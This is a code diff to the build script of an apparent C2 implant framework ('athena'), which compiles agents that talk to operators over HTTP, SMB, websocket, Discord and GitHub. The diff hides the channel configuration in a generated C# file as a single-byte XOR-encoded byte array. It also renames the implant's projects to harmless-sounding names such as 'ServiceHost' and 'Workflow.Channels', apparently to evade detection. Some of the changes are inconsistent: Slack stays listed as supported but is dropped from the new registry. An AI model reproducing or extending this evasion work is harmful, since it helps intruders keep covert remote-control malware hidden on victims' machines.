@@ -7,6 +7,7 @@ from distutils.dir_util import copy_tree
 from .athena_utils import plugin_utilities
 from .athena_utils import mac_bundler
 import asyncio
+import json
 import os
 import sys
 import shutil
@@ -147,6 +148,14 @@ class athena(PayloadType):
     ]
     c2_profiles = ["http", "websocket", "slack", "smb", "discord", "github"]
 
+    PROFILE_REGISTRY = {
+        "http":      ("Workflow.Channels.Http",      "HttpProfile.cs",      "Workflow.Channels.HTTP"),
+        "smb":       ("Workflow.Channels.Smb",       "SmbProfile.cs",       "Workflow.Channels.SMB"),
+        "websocket": ("Workflow.Channels.Websocket",  "WebsocketProfile.cs", "Workflow.Channels.Websocket"),
+        "discord":   ("Workflow.Channels.Discord",    "DiscordProfile.cs",   "Workflow.Channels.Discord"),
+        "github":    ("Workflow.Channels.GitHub",     "GitHubProfile.cs",    "Workflow.Channels.GitHub"),
+    }
+
     async def prepareWinExe(self, output_path):
         pe = pefile.PE(os.path.join(output_path, "{}.exe".format(self.get_parameter("assemblyname"))))
         pe.OPTIONAL_HEADER.Subsystem = 2
@@ -155,118 +164,78 @@ class athena(PayloadType):
         os.remove(os.path.join(output_path,"{}.exe".format(self.get_parameter("assemblyname"))))
         os.rename(os.path.join(output_path, "Agent_Headless.exe"), os.path.join(output_path, "Athena.exe"))
 
-    async def buildSlack(self, agent_build_path, c2):
-        baseConfigFile = open("{}/Agent.Profiles.Slack/Base.txt".format(agent_build_path.name), "r").read()
-        baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
+    def buildProfile(self, agent_build_path, c2, profile_name):
+        dir_name, _, assembly = self.PROFILE_REGISTRY[profile_name]
+        base_path = os.path.join(agent_build_path.name, dir_name)
+
+        # Collect parameters into a flat dict
+        config = {}
         for key, val in c2.get_parameters_dict().items():
+            if key == "AESPSK":
+                continue
             if key == "encrypted_exchange_check":
-                if val == "T":
-                    baseConfigFile = baseConfigFile.replace(key, "True")
-                else:
-                    baseConfigFile = baseConfigFile.replace(key, "False")  
+                config[key] = val == "T"
+            elif key == "headers":
+                config[key] = val
             else:
-                baseConfigFile = baseConfigFile.replace(str(key), str(val)) 
-        with open("{}/Agent.Profiles.Slack/SlackProfile.cs".format(agent_build_path.name), "w") as f:
-            f.write(baseConfigFile)
-        self.addProfile(agent_build_path, "Slack")
+                config[key] = val
 
-    async def buildDiscord(self, agent_build_path, c2):
-        baseConfigFile = open("{}/Agent.Profiles.Discord/Base.txt".format(agent_build_path.name), "r").read()
-        baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
-        for key, val in c2.get_parameters_dict().items():
-            if key == "encrypted_exchange_check":
-                if val == "T":
-                    baseConfigFile = baseConfigFile.replace(key, "True")
-                else:
-                    baseConfigFile = baseConfigFile.replace(key, "False")  
-            else:
-                baseConfigFile = baseConfigFile.replace(str(key), str(val)) 
-        with open("{}/Agent.Profiles.Discord/DiscordProfile.cs".format(agent_build_path.name), "w") as f:
-            f.write(baseConfigFile)
-        self.addProfile(agent_build_path, "Discord")
+        # Serialize to JSON
+        json_bytes = json.dumps(config).encode("utf-8")
 
-    async def buildGitHub(self, agent_build_path, c2):
-        baseConfigFile = open("{}/Agent.Profiles.GitHub/Base.txt".format(agent_build_path.name), "r").read()
-        #baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
-        for key, val in c2.get_parameters_dict().items():
-            if key == "encrypted_exchange_check":
-                if val == "T":
-                    baseConfigFile = baseConfigFile.replace(key, "True")
-                else:
-                    baseConfigFile = baseConfigFile.replace(key, "False")  
-            else:
-                baseConfigFile = baseConfigFile.replace(str(key), str(val)) 
-        with open("{}/Agent.Profiles.GitHub/GitHubProfile.cs".format(agent_build_path.name), "w") as f:
-            f.write(baseConfigFile)
-        self.addProfile(agent_build_path, "GitHub")
+        # XOR encode with random single-byte key
+        xor_key = random.randint(1, 255)
+        encoded = bytes(b ^ xor_key for b in json_bytes)
 
-    async def buildSMB(self, agent_build_path, c2):
-        baseConfigFile = open("{}/Agent.Profiles.Smb/Base.txt".format(agent_build_path.name), "r").read()
-        baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
-        for key, val in c2.get_parameters_dict().items():
-            if key == "encrypted_exchange_check":
-                if val == "T":
-                    baseConfigFile = baseConfigFile.replace(key, "True")
-                else:
-                    baseConfigFile = baseConfigFile.replace(key, "False")  
-            else:
-                baseConfigFile = baseConfigFile.replace(str(key), str(val)) 
-        with open("{}/Agent.Profiles.Smb/SmbProfile.cs".format(agent_build_path.name), "w") as f:
-            f.write(baseConfigFile)   
-        self.addProfile(agent_build_path, "Smb")
+        # Generate C# source with the encoded byte array
+        byte_literal = ", ".join(
+            "0x{:02X}".format(b) for b in encoded
+        )
 
-    async def buildHTTP(self, agent_build_path, c2):
-        baseConfigFile = open("{}/Agent.Profiles.Http/Base.txt".format(agent_build_path.name), "r").read()
-        baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
-        for key, val in c2.get_parameters_dict().items():
-            if key == "headers":
-                customHeaders = ""
-                for item in val:
-                    if item == "Host":
-                        baseConfigFile = baseConfigFile.replace("%HOSTHEADER%", val[item])
-                    elif item == "User-Agent":
-                        baseConfigFile = baseConfigFile.replace("%USERAGENT%", val[item])
-                    else:
-                        customHeaders += "this._client.DefaultRequestHeaders.Add(\"{}\", \"{}\");".format(str(item), str(val[item])) + '\n'  
-                
-                baseConfigFile = baseConfigFile.replace("%HOSTHEADER%", "")
-                baseConfigFile = baseConfigFile.replace("//%CUSTOMHEADERS%", customHeaders)   
-            elif key == "encrypted_exchange_check":
-                if val == "T":
-                    baseConfigFile = baseConfigFile.replace(key, "True")
-                else:
-                    baseConfigFile = baseConfigFile.replace(key, "False")  
-            else:
-                baseConfigFile = baseConfigFile.replace(str(key), str(val)) 
-        with open("{}/Agent.Profiles.Http/HttpProfile.cs".format(agent_build_path.name), "w") as f:
-            f.write(baseConfigFile)
-        self.addProfile(agent_build_path, "Http")
+        # Determine namespace based on profile
+        namespace = "Workflow.Channels"
+        if profile_name == "websocket":
+            namespace = "Workflow.Channels.Websocket"
+        elif profile_name == "smb":
+            namespace = "Workflow.Channels.Smb"
 
-    async def buildWebsocket(self, agent_build_path, c2):
-        baseConfigFile = open("{}/Agent.Profiles.Websocket/Base.txt".format(agent_build_path.name), "r").read()
-        baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
-        for key, val in c2.get_parameters_dict().items():
-            if key == "domain_front":
-                baseConfigFile = baseConfigFile.replace("%HOSTHEADER%", val)
-            elif key == "encrypted_exchange_check":
-                if val == "T":
-                    baseConfigFile = baseConfigFile.replace(key, "True")
-                else:
-                    baseConfigFile = baseConfigFile.replace(key, "False")  
-            else:
-                baseConfigFile = baseConfigFile.replace(str(key), str(val)) 
-        
-        # Failsafe to replace custom headers if they still don't exist
-        baseConfigFile = baseConfigFile.replace("%HOSTHEADER%", "")
-        #baseConfigFile = baseConfigFile.replace("//%CUSTOMHEADERS%", customHeaders) 
+        cs_source = (
+            "#if !CHECKYMANDERDEV\n"
+            "namespace {}\n"
+            "{{\n"
+            "    internal static class ChannelConfig\n"
+            "    {{\n"
+            "        private static readonly byte[] _d = "
+            "new byte[] {{ {} }};\n"
+            "        private static readonly byte _k = "
+            "0x{:02X};\n"
+            "\n"
+            "        internal static string Decode()\n"
+            "        {{\n"
+            "            byte[] r = new byte[_d.Length];\n"
+            "            for (int i = 0; i < _d.Length; i++)\n"
+            "                r[i] = (byte)(_d[i] ^ _k);\n"
+            "            return System.Text.Encoding"
+            ".UTF8.GetString(r);\n"
+            "        }}\n"
+            "    }}\n"
+            "}}\n"
+            "#endif\n"
+        ).format(namespace, byte_literal, xor_key)
 
-        with open("{}/Agent.Profiles.Websocket/WebsocketProfile.cs".format(agent_build_path.name), "w") as f:
-            f.write(baseConfigFile)
-        self.addProfile(agent_build_path, "Websocket")
+        config_path = os.path.join(
+            base_path, "ChannelConfig.g.cs"
+        )
+        with open(config_path, "w") as f:
+            f.write(cs_source)
+
+        self.addProfile(
+            agent_build_path, dir_name.split(".")[-1]
+        )
 
     def buildConfig(self, agent_build_path, c2):
         #I could modify this to be more efficient, but it doesn't take that long so screw it. Maybe later.
-        baseConfigFile = open("{}/AthenaCore/Config/AgentConfig.cs".format(agent_build_path.name), "r").read()
+        baseConfigFile = open("{}/ServiceHost/Config/ServiceConfig.cs".format(agent_build_path.name), "r").read()
         baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
         for key, val in c2.get_parameters_dict().items():
             if key == "AESPSK":
@@ -278,22 +247,22 @@ class athena(PayloadType):
             else:
                 baseConfigFile = baseConfigFile.replace(str(key), str(val))
                     
-        with open("{}/AthenaCore/Config/AgentConfig.cs".format(agent_build_path.name), "w") as f:
+        with open("{}/ServiceHost/Config/ServiceConfig.cs".format(agent_build_path.name), "w") as f:
             f.write(baseConfigFile)
 
     # These could be combined but that's a later problem.
     def addCommand(self, agent_build_path, command_name):
         project_path = os.path.join(agent_build_path.name, command_name, "{}.csproj".format(command_name))
-        p = subprocess.Popen(["dotnet", "add", "AthenaCore", "reference", project_path], cwd=agent_build_path.name)
+        p = subprocess.Popen(["dotnet", "add", "ServiceHost", "reference", project_path], cwd=agent_build_path.name)
         p.wait()
     
     def addCommands(self, agent_build_path, commands):
         #project_path = os.path.join(agent_build_path.name, command_name, "{}.csproj".format(command_name))
-        p = subprocess.Popen(["dotnet", "add", "AthenaCore", "reference"] + commands, cwd=agent_build_path.name)
+        p = subprocess.Popen(["dotnet", "add", "ServiceHost", "reference"] + commands, cwd=agent_build_path.name)
         p.wait()
     def addProfile(self, agent_build_path, profile):
-        project_path = os.path.join(agent_build_path.name, "Agent.Profiles.{}".format(profile), "Agent.Profiles.{}.csproj".format(profile))
-        p = subprocess.Popen(["dotnet", "add", "AthenaCore", "reference", project_path], cwd=agent_build_path.name)
+        project_path = os.path.join(agent_build_path.name, "Workflow.Channels.{}".format(profile), "Workflow.Channels.{}.csproj".format(profile))
+        p = subprocess.Popen(["dotnet", "add", "ServiceHost", "reference", project_path], cwd=agent_build_path.name)
         p.wait()
     
     def addAgentMod(self, agent_build_path, mod):
@@ -303,12 +272,12 @@ class athena(PayloadType):
             "benign-lookup": "AgentDomainLookup",
         }
         project_path = os.path.join(agent_build_path.name, mod_map[mod], "{}.csproj".format(mod_map[mod]))
-        p = subprocess.Popen(["dotnet", "add", "AthenaCore", "reference", project_path], cwd=agent_build_path.name)
+        p = subprocess.Popen(["dotnet", "add", "ServiceHost", "reference", project_path], cwd=agent_build_path.name)
         p.wait()
 
     def addCrypto(self, agent_build_path, type):
-        project_path = os.path.join(agent_build_path.name, "Agent.Crypto.{}".format(type), "Agent.Crypto.{}.csproj".format(type))
-        p = subprocess.Popen(["dotnet", "add", "AthenaCore", "reference", project_path], cwd=agent_build_path.name)
+        project_path = os.path.join(agent_build_path.name, "Workflow.Security.{}".format(type), "Workflow.Security.{}.csproj".format(type))
+        p = subprocess.Popen(["dotnet", "add", "ServiceHost", "reference", project_path], cwd=agent_build_path.name)
         p.wait()
 
     def addNuget(self, agent_build_path, package_name, project):
@@ -348,13 +317,13 @@ class athena(PayloadType):
             return "rhel-x64"
         
     async def updateRootsFile(self, agent_build_path, roots_replace):
-            baseRoots = open("{}/AthenaCore/Roots.xml".format(agent_build_path.name), "r").read()
+            baseRoots = open("{}/ServiceHost/Roots.xml".format(agent_build_path.name), "r").read()
             baseRoots = baseRoots.replace("<!-- {{REPLACEME}} -->", roots_replace)
-            with open("{}/AthenaCore/Roots.xml".format(agent_build_path.name), "w") as f:
+            with open("{}/ServiceHost/Roots.xml".format(agent_build_path.name), "w") as f:
                 f.write(baseRoots)   
 
     async def getBuildCommand(self, rid):
-            return "dotnet publish AthenaCore -r {} -c {} --nologo --self-contained={} /p:PublishSingleFile={} /p:EnableCompressionInSingleFile={} \
+            return "dotnet publish ServiceHost -r {} -c {} --nologo --self-contained={} /p:PublishSingleFile={} /p:EnableCompressionInSingleFile={} \
                 /p:PublishTrimmed={} /p:Obfuscate={} /p:PublishAOT={} /p:DebugType=None /p:DebugSymbols=false /p:PluginsOnly=false \
                 /p:HandlerOS={} /p:UseSystemResourceKeys={} /p:InvariantGlobalization={} /p:StackTraceSupport={} /p:PayloadUUID={} \
                 /p:WindowsService={} /p:RandomName={}".format(
@@ -375,7 +344,7 @@ class athena(PayloadType):
                 self.get_parameter("assemblyname")
                 )
     async def getBuildCommentModels(self):
-        return "dotnet build Agent.Models -c {} /p:Obfuscate={} /p:PayloadUUID={}".format(
+        return "dotnet build Workflow.Models -c {} /p:Obfuscate={} /p:PayloadUUID={}".format(
             self.get_parameter("configuration"),
             self.get_parameter("obfuscate"),
             self.get_parameter(self.uuid)
@@ -391,7 +360,7 @@ class athena(PayloadType):
             if self.get_parameter("output-type") == "app bundle":
                 if self.selected_os.upper() != "MACOS":
                     return await self.returnFailure(resp, "Error building payload: App Bundles are only supported on MacOS", "Error occurred while building payload. Check stderr for more information.")
-                #self.addNuget(agent_build_path, "Dotnet.Bundle", "AthenaCore")
+                #self.addNuget(agent_build_path, "Dotnet.Bundle", "ServiceHost")
 
             if self.get_parameter("output-type") == "windows service":
                 if self.get_parameter("obfuscate") == True:
@@ -411,26 +380,12 @@ class athena(PayloadType):
 
             for c2 in self.c2info:
                 profile = c2.get_c2profile()
-                if profile["name"] == "http":
-                    roots_replace += "<assembly fullname=\"Agent.Profiles.HTTP\"/>" + '\n'
-                    await self.buildHTTP(agent_build_path, c2)
-                elif profile["name"] == "smb":
-                    roots_replace += "<assembly fullname=\"Agent.Profiles.SMB\"/>" + '\n'
-                    await self.buildSMB(agent_build_path, c2)
-                elif profile["name"] == "websocket":
-                    roots_replace += "<assembly fullname=\"Agent.Profiles.Websocket\"/>" + '\n'
-                    await self.buildWebsocket(agent_build_path, c2)
-                elif profile["name"] == "slack":
-                    roots_replace += "<assembly fullname=\"Agent.Profiles.Slack\"/>" + '\n'
-                    await self.buildSlack(agent_build_path, c2)
-                elif profile["name"] == "discord":
-                    roots_replace += "<assembly fullname=\"Agent.Profiles.Discord\"/>" + '\n'
-                    await self.buildDiscord(agent_build_path, c2)
-                elif profile["name"] == "github":
-                    roots_replace += "<assembly fullname=\"Agent.Profiles.GitHub\"/>" + '\n'
-                    await self.buildGitHub(agent_build_path, c2)
-                else:
-                    raise Exception("Unsupported C2 profile type for Athena: {}".format(profile["name"]))
+                name = profile["name"]
+                if name not in self.PROFILE_REGISTRY:
+                    raise Exception("Unsupported C2 profile type for Athena: {}".format(name))
+                _, _, assembly = self.PROFILE_REGISTRY[name]
+                roots_replace += '<assembly fullname="{}"/>'.format(assembly) + '\n'
+                self.buildProfile(agent_build_path, c2, name)
             
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
@@ -529,7 +484,7 @@ class athena(PayloadType):
             if(self.get_parameter("trimmed") == True):
                 command += " /p:OptimizationPreference=Size"
             
-            output_path = "{}/AthenaCore/bin/{}/net8.0/{}/publish/".format(agent_build_path.name,self.get_parameter("configuration").capitalize(), rid)
+            output_path = "{}/ServiceHost/bin/{}/net8.0/{}/publish/".format(agent_build_path.name,self.get_parameter("configuration").capitalize(), rid)
 
             #Run command and get output
             try:
